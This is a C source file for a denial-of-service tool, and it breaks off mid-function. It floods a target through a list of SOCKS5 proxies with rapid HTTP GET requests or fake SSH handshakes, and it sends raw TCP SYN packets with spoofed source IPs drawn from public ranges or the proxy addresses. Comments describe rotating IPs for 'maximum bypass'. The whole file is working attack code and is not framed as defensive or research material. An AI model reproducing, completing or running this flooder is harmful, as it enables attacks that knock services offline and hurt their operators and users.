#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<errno.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/select.h>
#include <poll.h>
#ifdef __linux__
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#define HAVE_SENDMMSG
#endif

#ifndef TCP_NODELAY
#define TCP_NODELAY 1
#endif

typedef unsigned char u_char;

#define TCP_OPT_NOP           1
#define TCP_OPT_MSS           2
#define TCP_OPT_WINDOW        3
#define TCP_OPT_SACK_PERM     4
#define TCP_OPT_SACK          5
#define TCP_OPT_TIMESTAMP     8

static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 0;
volatile unsigned int lenght_pkt = 0;
volatile int g_running = 1;
static volatile int g_signal_count = 0;
volatile int g_threads_ready = 0;
pthread_mutex_t g_stats_mutex = PTHREAD_MUTEX_INITIALIZER;
#define MAX_PROXIES 10000
#define MAX_PROXY_LINE 256

typedef struct {
    char ip[64];
    int port;
    char username[256];
    char password[256];
    int has_auth;
    int is_valid;
    uint64_t last_used;
    uint64_t failures;
} socks5_proxy_t;

socks5_proxy_t g_proxies[MAX_PROXIES];
int g_proxy_count = 0;
pthread_mutex_t g_proxy_mutex = PTHREAD_MUTEX_INITIALIZER;
volatile int g_proxy_idx = 0;
int g_use_proxies = 0;

volatile uint64_t g_total_packets_sent = 0;
volatile uint64_t g_total_packets_failed = 0;
volatile uint64_t g_eagain_count = 0;
volatile uint64_t g_real_errors = 0;
volatile uint64_t g_error_ebadf = 0;
volatile uint64_t g_error_einval = 0;
volatile uint64_t g_error_eacces = 0;
volatile uint64_t g_error_other = 0;
volatile uint64_t g_proxy_connections = 0;
volatile uint64_t g_proxy_failures = 0;

struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
    struct tcphdr tcp;
};

// standard checksum calc
static inline unsigned short checksum_tcp_packet(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
 
    sum = (sum>>16) + (sum & 0xffff);
    sum = sum + (sum>>16);
    answer = (short)~sum;

    return answer;
}

int random_number_beetwhen(int min, int max);
void *proxy_worker_thread(void *par1);
void *flooding_thread(void *par1);
void *stats_thread(void *arg);
int load_socks5_proxies(const char *filename) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        perror("Failed to open socks5.txt");
        return 0;
    }
    
    char line[MAX_PROXY_LINE];
    g_proxy_count = 0;
    
    while (fgets(line, sizeof(line), fp) && g_proxy_count < MAX_PROXIES) {
        // Skip comments and empty lines
        if (line[0] == '#' || line[0] == '\n' || line[0] == '\r') {
            continue;
        }
        
        // Remove newline
        line[strcspn(line, "\r\n")] = 0;
        
        // Skip empty lines after trimming
        if (strlen(line) == 0) {
            continue;
        }
        
        socks5_proxy_t *proxy = &g_proxies[g_proxy_count];
        memset(proxy, 0, sizeof(socks5_proxy_t));
        
        // Parse format: ip:port or ip:port:user:pass
        char *saveptr = NULL;
        char *token = strtok_r(line, ":", &saveptr);
        if (!token) continue;
        
        size_t ip_len = strlen(token);
        if (ip_len >= sizeof(proxy->ip)) {
            continue; // IP too long
        }
        strncpy(proxy->ip, token, sizeof(proxy->ip) - 1);
        proxy->ip[sizeof(proxy->ip) - 1] = '\0';
        
        token = strtok_r(NULL, ":", &saveptr);
        if (!token) continue;
        
        proxy->port = atoi(token);
        if (proxy->port <= 0 || proxy->port > 65535) continue;
        
        // Check for authentication
        token = strtok_r(NULL, ":", &saveptr);
        if (token) {
            size_t user_len = strlen(token);
            if (user_len >= sizeof(proxy->username)) {
                continue;
            }
            strncpy(proxy->username, token, sizeof(proxy->username) - 1);
            proxy->username[sizeof(proxy->username) - 1] = '\0';
            
            token = strtok_r(NULL, ":", &saveptr);
            if (token) {
                size_t pass_len = strlen(token);
                if (pass_len >= sizeof(proxy->password)) {
                    continue;
                }
                strncpy(proxy->password, token, sizeof(proxy->password) - 1);
                proxy->password[sizeof(proxy->password) - 1] = '\0';
                proxy->has_auth = 1;
            }
        }
        
        proxy->is_valid = 1;
        proxy->last_used = 0;
        proxy->failures = 0;
        g_proxy_count++;
    }
    
    fclose(fp);
    return g_proxy_count;
}

int socks5_connect(int sockfd, const char *target_ip, int target_port, socks5_proxy_t *proxy) {
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 500000;  // 500ms timeout
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
    
    unsigned char handshake[3] = {0x05, 0x01, proxy->has_auth ? 0x02 : 0x00};
    ssize_t sent = send(sockfd, handshake, 3, 0);
    if (sent != 3) {
        return -1;
    }
    
    unsigned char response[2];
    ssize_t recv_len = recv(sockfd, response, 2, MSG_WAITALL);
    if (recv_len != 2 || response[0] != 0x05) {
        return -1;
    }
    
    if (proxy->has_auth && response[1] != 0x02) {
        return -1;
    }
    if (proxy->has_auth && response[1] == 0x02) {
        int ulen = strlen(proxy->username);
        int plen = strlen(proxy->password);
        if (ulen > 255 || plen > 255 || ulen == 0 || plen == 0) {
            return -1;
        }
        
        unsigned char auth[3 + 255 + 255];
        auth[0] = 0x01;
        auth[1] = (unsigned char)ulen;
        memcpy(auth + 2, proxy->username, ulen);
        auth[2 + ulen] = (unsigned char)plen;
        memcpy(auth + 3 + ulen, proxy->password, plen);
        
        sent = send(sockfd, auth, 3 + ulen + plen, 0);
        if (sent != (3 + ulen + plen)) {
            return -1;
        }
        
        unsigned char auth_response[2];
        recv_len = recv(sockfd, auth_response, 2, MSG_WAITALL);
        if (recv_len != 2 || auth_response[0] != 0x01 || auth_response[1] != 0x00) {
            return -1;
        }
    } else if (proxy->has_auth) {
        return -1;
    }
    
    struct in_addr addr;
    if (inet_aton(target_ip, &addr) == 0) {
        return -1;
    }
    
    unsigned char connect_req[10];
    connect_req[0] = 0x05;
    connect_req[1] = 0x01;
    connect_req[2] = 0x00;
    connect_req[3] = 0x01;
    memcpy(connect_req + 4, &addr.s_addr, 4);
    connect_req[8] = (target_port >> 8) & 0xFF;
    connect_req[9] = target_port & 0xFF;
    
    sent = send(sockfd, connect_req, 10, 0);
    if (sent != 10) {
        return -1;
    }
    
    unsigned char connect_resp_buf[256];
    ssize_t resp_len = recv(sockfd, connect_resp_buf, sizeof(connect_resp_buf), 0);
    if (resp_len < 4) {
        return -1;
    }
    
    if (connect_resp_buf[0] != 0x05) {
        return -1;
    }
    
    if (connect_resp_buf[1] != 0x00) {
        return -1;
    }
    
    return 0;
}

socks5_proxy_t* get_next_proxy() {
    if (g_proxy_count == 0) return NULL;
    
    int attempts = 0;
    socks5_proxy_t *proxy = NULL;
    
    while (attempts < g_proxy_count) {
        int idx = __sync_fetch_and_add(&g_proxy_idx, 1) % g_proxy_count;
        proxy = &g_proxies[idx];
        
        uint64_t failures = __sync_fetch_and_add(&proxy->failures, 0);
        if (proxy->is_valid && failures < 30) {
            proxy->last_used = time(NULL);
            return proxy;
        }

        attempts++;
    }
    
    for (int i = 0; i < g_proxy_count; i++) {
        proxy = &g_proxies[i];
        uint64_t failures = __sync_fetch_and_add(&proxy->failures, 0);
        if (proxy->is_valid && failures < 100) {
            __sync_lock_test_and_set((uint64_t*)&proxy->failures, 0);
            proxy->last_used = time(NULL);
            return proxy;
        }
    }
    
    return NULL;
}
void mark_proxy_failed(socks5_proxy_t *proxy) {
    if (proxy) {
        __sync_add_and_fetch(&proxy->failures, 1);
    }
}

// typo in name but too lazy to fix everywhere
static inline uint32_t generate_spoofed_ip(int thread_id, int iteration) {
    // mix thread id, iteration, and time for variety
    uint32_t time_seed = (uint32_t)time(NULL);
    uint32_t rotation_key = (thread_id * 7919) + (iteration * 997) + (time_seed * 8191) + 
                           (iteration * 3571) + (thread_id * 5779) + (iteration * 7919);
    int ip_class = rotation_key % 100;
    uint32_t ip_offset = rotation_key % 16777216;
    uint32_t new_ip;
    if (ip_class < 3) {
        new_ip = (10UL << 24) | (ip_offset & 0x00FFFFFF);  // Private
    } else if (ip_class < 6) {
        uint32_t subnet = 16 + ((ip_offset >> 16) % 16);
        new_ip = (172UL << 24) | (subnet << 16) | (ip_offset & 0x0000FFFF);  // Private
    } else if (ip_class < 9) {
        new_ip = (192UL << 24) | (168UL << 16) | (ip_offset & 0x0000FFFF);  // Private
    } else if (ip_class < 12) {
        new_ip = (1UL << 24) | (ip_offset & 0x00FFFFFF);  // APNIC
    } else if (ip_class < 15) {
        new_ip = (8UL << 24) | (ip_offset & 0x00FFFFFF);  // Level3
    } else if (ip_class < 18) {
        new_ip = (14UL << 24) | (ip_offset & 0x00FFFFFF);  // APNIC
    } else if (ip_class < 21) {
        new_ip = (23UL << 24) | (ip_offset & 0x00FFFFFF);  // ARIN
    } else if (ip_class < 24) {
        new_ip = (24UL << 24) | (ip_offset & 0x00FFFFFF);  // ARIN
    } else if (ip_class < 27) {
        new_ip = (27UL << 24) | (ip_offset & 0x00FFFFFF);  // APNIC
    } else if (ip_class < 30) {
        new_ip = (31UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 33) {
        new_ip = (37UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 36) {
        new_ip = (41UL << 24) | (ip_offset & 0x00FFFFFF);  // AfriNIC
    } else if (ip_class < 39) {
        new_ip = (42UL << 24) | (ip_offset & 0x00FFFFFF);  // APNIC
    } else if (ip_class < 42) {
        new_ip = (46UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 45) {
        new_ip = (47UL << 24) | (ip_offset & 0x00FFFFFF);  // ARIN
    } else if (ip_class < 48) {
        new_ip = (49UL << 24) | (ip_offset & 0x00FFFFFF);  // APNIC
    } else if (ip_class < 51) {
        new_ip = (54UL << 24) | (ip_offset & 0x00FFFFFF);  // AWS
    } else if (ip_class < 54) {
        new_ip = (78UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 57) {
        new_ip = (88UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 60) {
        new_ip = (91UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 63) {
        new_ip = (93UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 66) {
        new_ip = (103UL << 24) | (ip_offset & 0x00FFFFFF);  // ARIN
    } else if (ip_class < 69) {
        new_ip = (104UL << 24) | (ip_offset & 0x00FFFFFF);  // CloudFlare
    } else if (ip_class < 72) {
        new_ip = (141UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 75) {
        new_ip = (149UL << 24) | (ip_offset & 0x00FFFFFF);  // ARIN
    } else if (ip_class < 78) {
        new_ip = (185UL << 24) | (ip_offset & 0x00FFFFFF);  // Target range
    } else if (ip_class < 81) {
        new_ip = (188UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 84) {
        new_ip = (192UL << 24) | (ip_offset & 0x00FFFFFF);  // ARIN
    } else if (ip_class < 87) {
        new_ip = (203UL << 24) | (ip_offset & 0x00FFFFFF);  // APNIC
    } else if (ip_class < 90) {
        new_ip = (213UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 93) {
        new_ip = (217UL << 24) | (ip_offset & 0x00FFFFFF);  // RIPE
    } else if (ip_class < 96) {
        new_ip = (220UL << 24) | (ip_offset & 0x00FFFFFF);  // APNIC
    } else {
        // random public IP, avoid reserved ranges
        int octet1 = random_number_beetwhen(1, 223);
        while (octet1 == 127 || octet1 == 0 || (octet1 >= 224 && octet1 <= 255)) {
            octet1 = random_number_beetwhen(1, 223);
        }
        new_ip = (octet1 << 24) | (ip_offset & 0x00FFFFFF);
    }
    
    return new_ip;
}
void *proxy_worker_thread(void *par1) {
    if (!par1) {
        return NULL;
    }
    
    char *target_ip = (char *)par1;
    long thread_id = (long)pthread_self();
    int consecutive_failures = 0;
    int iterations = 0;
    
    __sync_add_and_fetch(&g_threads_ready, 1);
    
    char http_template[512];
    snprintf(http_template, sizeof(http_template), 
        "GET /?id=%lu&t=%lu HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: max-age=0\r\n"
        "\r\n",
        (unsigned long)thread_id, (unsigned long)time(NULL), target_ip);
    
    const int max_concurrent = 100;
    int active_sockets[max_concurrent];
    socks5_proxy_t *active_proxies[max_concurrent];
    int active_count = 0;
    uint64_t request_id = thread_id * 1000000;
    
    char ssh_prefix[] = "SSH-2.0-OpenSSH_8.0\r\nKEYEXINIT";
    char ssh_mid[] = "\r\nNEWKEYS";
    char ssh_mid2[] = "\r\nSERVICE_REQUEST";
    char ssh_suffix[] = "\r\n";
    
    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    };
    int ua_count = sizeof(user_agents) / sizeof(user_agents[0]);
    
    char http_suffix[] = "\r\n";
    const int http_suffix_len = 2;
    
    time_t cached_time = time(NULL);
    int time_update_counter = 0;
    
    while (g_running) {
        iterations++;
        
        int connection_attempts = 0;
        int max_attempts_per_iteration = 30;
        
        if (active_count > 0 && active_count < max_concurrent / 2) {
            max_attempts_per_iteration = 50;
        }
        
        while (active_count < max_concurrent && g_running && connection_attempts < max_attempts_per_iteration) {
            connection_attempts++;
            
        socks5_proxy_t *proxy = get_next_proxy();
        if (!proxy || !proxy->is_valid) {
            if (g_proxy_count == 0) {
                    break; // No proxies at all - exit connection loop
                }
                continue; // Try next proxy immediately
            }
            
            uint64_t failures = __sync_fetch_and_add(&proxy->failures, 0);
            if (failures > 30) {
                continue;
        }
        
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
                mark_proxy_failed(proxy);
            continue;
        }
        
            int sendbuf = 1024 * 1024;
            int recvbuf = 1024 * 1024;
            setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
            setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &recvbuf, sizeof(recvbuf));
            
            int nodelay = 1;
            setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
            
        int flags = fcntl(sockfd, F_GETFL, 0);
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
        
        struct sockaddr_in proxy_addr;
        memset(&proxy_addr, 0, sizeof(proxy_addr));
        proxy_addr.sin_family = AF_INET;
        proxy_addr.sin_port = htons(proxy->port);
        if (inet_aton(proxy->ip, &proxy_addr.sin_addr) == 0) {
            close(sockfd);
                mark_proxy_failed(proxy);
            continue;
        }
        
            connect(sockfd, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr));
            
            struct pollfd pfd;
            pfd.fd = sockfd;
            pfd.events = POLLOUT;
            int poll_result = poll(&pfd, 1, 50);
            
            if (poll_result <= 0) {
            close(sockfd);
                mark_proxy_failed(proxy);
            consecutive_failures++;
            continue;
        }
        
        int so_error = 0;
        socklen_t len = sizeof(so_error);
        if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &so_error, &len) < 0 || so_error != 0) {
            close(sockfd);
                mark_proxy_failed(proxy);
            consecutive_failures++;
            continue;
        }
        
        fcntl(sockfd, F_SETFL, flags);
        
            int connect_result = socks5_connect(sockfd, target_ip, floodport, proxy);
            if (connect_result < 0) {
            close(sockfd);
                __sync_add_and_fetch(&g_proxy_failures, 1);
                mark_proxy_failed(proxy);
            consecutive_failures++;
            continue;
        }
        
            active_sockets[active_count] = sockfd;
            active_proxies[active_count] = proxy;
            active_count++;
            __sync_add_and_fetch(&g_proxy_connections, 1);
        consecutive_failures = 0;
        
            for (int i = 0; i < 2000 && g_running; i++) {
            char data[512];
                request_id++;
                int data_len;
                
                if (floodport == 22) {
                    data_len = snprintf(data, sizeof(data), "%s%lu%s%lu%s%lu%s", 
                        ssh_prefix, request_id, ssh_mid, request_id * 100, 
                        ssh_mid2, request_id * 1000, ssh_suffix);
                } else {
                    if (time_update_counter++ % 100 == 0) {
                        cached_time = time(NULL);
                    }
                    
                    const char* ua = user_agents[request_id % ua_count];
                    
                    int len = snprintf(data, sizeof(data),
                        "GET /?id=%lu&t=%lu&i=%lu&r=%lu&_=%lu HTTP/1.1\r\n"
                        "Host: %s:%d\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.9\r\n"
                        "Accept-Encoding: gzip, deflate, br\r\n"
                "Connection: keep-alive\r\n"
                        "Upgrade-Insecure-Requests: 1\r\n"
                        "Sec-Fetch-Dest: document\r\n"
                        "Sec-Fetch-Mode: navigate\r\n"
                        "Sec-Fetch-Site: none\r\n"
                        "Cache-Control: max-age=0\r\n",
                        request_id, (unsigned long)cached_time, request_id, request_id * 7, request_id,
                        target_ip, floodport, ua);
            
                    memcpy(data + len, http_suffix, http_suffix_len);
                    data_len = len + http_suffix_len;
                }
                
                ssize_t sent = send(sockfd, data, data_len, MSG_DONTWAIT);
            if (sent > 0) {
                __sync_add_and_fetch(&g_total_packets_sent, 1);
                __sync_add_and_fetch(&pps, 1);
                } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    break;
                }
            }
        }
        
        for (int sock_idx = active_count - 1; sock_idx >= 0 && g_running; sock_idx--) {
            int sockfd = active_sockets[sock_idx];
            if (sockfd < 0) {
                if (active_count > 1) {
                    active_sockets[sock_idx] = active_sockets[active_count - 1];
                    active_proxies[sock_idx] = active_proxies[active_count - 1];
                }
                active_count--;
                    continue;
            }
            
            int sent_count = 0;
            int consecutive_errors = 0;
            for (int i = 0; i < 50000 && g_running && consecutive_errors < 2; i++) {
                char data[512];
                request_id++;
                
                int data_len;
                if (floodport == 22) {
                    data_len = snprintf(data, sizeof(data), "%s%lu%s%lu%s%lu%s", 
                        ssh_prefix, request_id, ssh_mid, request_id * 100, 
                        ssh_mid2, request_id * 1000, ssh_suffix);
                } else {
                    if (time_update_counter++ % 200 == 0) {
                        cached_time = time(NULL);
                    }
                    
                    const char* ua = user_agents[request_id % ua_count];
                    
                    int len = snprintf(data, sizeof(data),
                        "GET /?id=%lu&t=%lu&i=%lu&r=%lu&_=%lu HTTP/1.1\r\n"
                        "Host: %s:%d\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.9\r\n"
                        "Accept-Encoding: gzip, deflate, br\r\n"
                        "Connection: keep-alive\r\n"
                        "Upgrade-Insecure-Requests: 1\r\n"
                        "Sec-Fetch-Dest: document\r\n"
                        "Sec-Fetch-Mode: navigate\r\n"
                        "Sec-Fetch-Site: none\r\n"
                        "Sec-Fetch-User: ?1\r\n"
                        "Cache-Control: max-age=0\r\n"
                        "DNT: 1\r\n"
                        "Pragma: no-cache\r\n",
                        request_id, (unsigned long)cached_time, request_id, request_id * 7, request_id,
                        target_ip, floodport, ua);
                    
                    memcpy(data + len, http_suffix, http_suffix_len);
                    data_len = len + http_suffix_len;
                }
                ssize_t sent = send(sockfd, data, data_len, MSG_DONTWAIT);
                if (sent > 0) {
                    __sync_add_and_fetch(&g_total_packets_sent, 1);
                    __sync_add_and_fetch(&pps, 1);
                    sent_count++;
                    consecutive_errors = 0;
                } else {
                    int saved_errno = errno;
                    if (saved_errno == EAGAIN || saved_errno == EWOULDBLOCK) {
                        break;
                    } else {
                        consecutive_errors++;
                        if (consecutive_errors >= 2) {
                            close(sockfd);
                            if (active_count > 1 && sock_idx < active_count - 1) {
                                active_sockets[sock_idx] = active_sockets[active_count - 1];
                                active_proxies[sock_idx] = active_proxies[active_count - 1];
                            }
                            active_count--;
                            sock_idx++;
                            break;
                        }
                    }
                }
            }
        }
    }
    
    for (int i = 0; i < active_count; i++) {
        if (active_sockets[i] >= 0) {
            close(active_sockets[i]);
        }
    }
    
    return NULL;
}

typedef struct {
    uint32_t source_ip;
    uint16_t source_port;
    uint32_t seq_base;
    uint32_t seq_current;
    uint64_t packet_count;
} conn_state_t;

#define MAX_CONN_STATES 10000
#define CONN_HASH_TABLE_SIZE 16384

conn_state_t* get_conn_state(conn_state_t *conn_states, int *conn_state_count, 
                             uint32_t source_ip, uint16_t source_port, 
                             uint32_t base_seq,
                             int *hash_table) {
    uint32_t hash = (source_ip ^ source_port) & (CONN_HASH_TABLE_SIZE - 1);
    
    int idx = hash_table[hash];
    if (idx >= 0 && idx < *conn_state_count) {
        if (conn_states[idx].source_ip == source_ip && conn_states[idx].source_port == source_port) {
            return &conn_states[idx];
        }
    }
    
    for (int i = 0; i < *conn_state_count; i++) {
        if (conn_states[i].source_ip == source_ip && conn_states[i].source_port == source_port) {
            hash_table[hash] = i;
            return &conn_states[i];
        }
    }
    
    if (*conn_state_count < MAX_CONN_STATES) {
        conn_state_t *state = &conn_states[(*conn_state_count)++];
        state->source_ip = source_ip;
        state->source_port = source_port;
        state->seq_base = base_seq;
        state->seq_current = base_seq + random_number_beetwhen(1, 1000000);
        state->packet_count = 0;
        hash_table[hash] = *conn_state_count - 1;
        return state;
    }
    
    return &conn_states[hash % MAX_CONN_STATES];
}

void *flooding_thread(void *par1) {
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    
    __sync_add_and_fetch(&g_threads_ready, 1);
    
    long thread_id = (long)pthread_self();
    
    conn_state_t *conn_states = (conn_state_t *)calloc(MAX_CONN_STATES, sizeof(conn_state_t));
    int conn_state_count = 0;
    int *hash_table = (int *)calloc(CONN_HASH_TABLE_SIZE, sizeof(int));
    if (!conn_states || !hash_table) {
        if (conn_states) free(conn_states);
        if (hash_table) free(hash_table);
        conn_states = NULL;
        hash_table = NULL;
    } else {
        for (int i = 0; i < CONN_HASH_TABLE_SIZE; i++) {
            hash_table[i] = -1;
        }
    }
    
    const int num_sockets = 5000;
    int *sockets = (int *)calloc(num_sockets, sizeof(int));
    if (!sockets) {
        if (conn_states) free(conn_states);
        if (hash_table) free(hash_table);
        return NULL;
    }
    int sockets_created = 0;
    
    for (int i = 0; i < num_sockets; i++) {
        sockets[i] = -1;
    }
    
    typedef struct {
        int *sockets;
        int sockets_created;
        int num_sockets;
        conn_state_t *conn_states;
        int *hash_table;
    } thread_cleanup_data_t;
    
    thread_cleanup_data_t cleanup_data;
    cleanup_data.sockets = sockets;
    cleanup_data.sockets_created = 0;
    cleanup_data.num_sockets = num_sockets;
    cleanup_data.conn_states = conn_states;
    cleanup_data.hash_table = hash_table;
    
    void cleanup_handler(void *arg) {
        thread_cleanup_data_t *data = (thread_cleanup_data_t *)arg;
        if (data && data->sockets) {
            for (int i = 0; i < data->num_sockets; i++) {
                if (data->sockets[i] != -1) {
                    close(data->sockets[i]);
                    data->sockets[i] = -1;
                }
            }
            free(data->sockets);
        }
        if (data && data->conn_states) {
            free(data->conn_states);
        }
        if (data && data->hash_table) {
            free(data->hash_table);
        }
    }
    
    for (int sock_idx = 0; sock_idx < num_sockets; sock_idx++) {
        sockets[sock_idx] = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sockets[sock_idx] == -1) {
            if (sock_idx == 0) {
                free(sockets);
                if (conn_states) free(conn_states);
                if (hash_table) free(hash_table);
                return NULL;
            }
            continue;
        }
        
        int one = 1;
        if (setsockopt(sockets[sock_idx], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            close(sockets[sock_idx]);
            sockets[sock_idx] = -1;
            continue;
        }
        
        int sendbuf = 256 * 1024 * 1024;
        int recvbuf = 256 * 1024 * 1024;
            setsockopt(sockets[sock_idx], SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
            setsockopt(sockets[sock_idx], SOL_SOCKET, SO_RCVBUF, &recvbuf, sizeof(recvbuf));
            
            int flags = fcntl(sockets[sock_idx], F_GETFL, 0);
            fcntl(sockets[sock_idx], F_SETFL, flags | O_NONBLOCK);
            sockets_created++;
            cleanup_data.sockets_created = sockets_created;
    }
    
    if (sockets_created == 0) {
        free(sockets);
        if (conn_states) free(conn_states);
        if (hash_table) free(hash_table);
        return NULL;
    }
    
    pthread_cleanup_push(cleanup_handler, &cleanup_data);

    char *targettr = (char *)par1;
    char datagram[4096], *data;
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    
    uint8_t tcp_options[40];
    int tcp_optlen = 0;

    data = "";

    sin.sin_family = AF_INET;
    int rdzeroport;
    if (floodport == 1) {
        rdzeroport = random_number_beetwhen(2, 65535);
        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons(rdzeroport);
    } else {
        sin.sin_port = htons(floodport);
        tcph->dest = htons(floodport);
    }

    sin.sin_addr.s_addr = inet_addr(targettr);
    
    uint32_t base_spoofed_ip;
    if (g_use_proxies && g_proxy_count > 0) {
        // Use actual proxy IPs for spoofing - rotate through proxies
        socks5_proxy_t *proxy = get_next_proxy();
        if (proxy && proxy->is_valid) {
            struct in_addr proxy_addr;
            if (inet_aton(proxy->ip, &proxy_addr) != 0) {
                base_spoofed_ip = proxy_addr.s_addr;
            } else {
                base_spoofed_ip = generate_spoofed_ip((int)thread_id, 0);
            }
        } else {
            base_spoofed_ip = generate_spoofed_ip((int)thread_id, 0);
        }
    } else {
        base_spoofed_ip = generate_spoofed_ip((int)thread_id, 0);
    }
    uint32_t spoofed_ip = base_spoofed_ip;
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
    iph->id = htons(random_number_beetwhen(1, 65535));
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = spoofed_ip;
    iph->daddr = sin.sin_addr.s_addr;
    
    // Initialize base sequences (used for connection state tracking)
    // SYN packets only need sequence numbers (no ACK)
    uint32_t time_base = (uint32_t)time(NULL);
    uint32_t base_seq = (time_base * 2500000) + ((int)thread_id * 100000000) + 
                        random_number_beetwhen(10000000, 500000000);
    
    // Initialize variables for packet construction
    int randSP = random_number_beetwhen(1024, 65535);
    int randWin = random_number_beetwhen(8192, 65535);
    
    // Initialize TCP header basic fields (will be updated in loop)
    // SYN packets: SYN=1, ACK=0
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;  // SYN flag set
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;  // No ACK in SYN packets
    tcph->urg = 0;
    tcph->window = htons(randWin);
    tcph->urg_ptr = 0;
    
    int iteration = 0;
    int socket_idx = 0;
    
    while (g_running) {
        // IMMEDIATE EXIT: Check g_running frequently for fast response to CTRL+C
        if (!g_running) break;
        
        int s = sockets[socket_idx % sockets_created];
        socket_idx++;
        
        for (int burst = 0; burst < 5000000; burst++) {
            iteration++;
            
            if ((burst % 50000 == 0) && !g_running) break;
            if (g_use_proxies && g_proxy_count > 0) {
                // Rotate through proxy IPs for maximum bypass - every packet uses different proxy IP
                socks5_proxy_t *proxy = get_next_proxy();
                if (proxy && proxy->is_valid) {
                    struct in_addr proxy_addr;
                    if (inet_aton(proxy->ip, &proxy_addr) != 0) {
                        spoofed_ip = proxy_addr.s_addr;
                    } else {
                        // Fallback to generated IP if proxy IP invalid
            spoofed_ip = generate_spoofed_ip((int)thread_id, iteration + burst);
                    }
                } else {
                    // Fallback to generated IP if no valid proxy
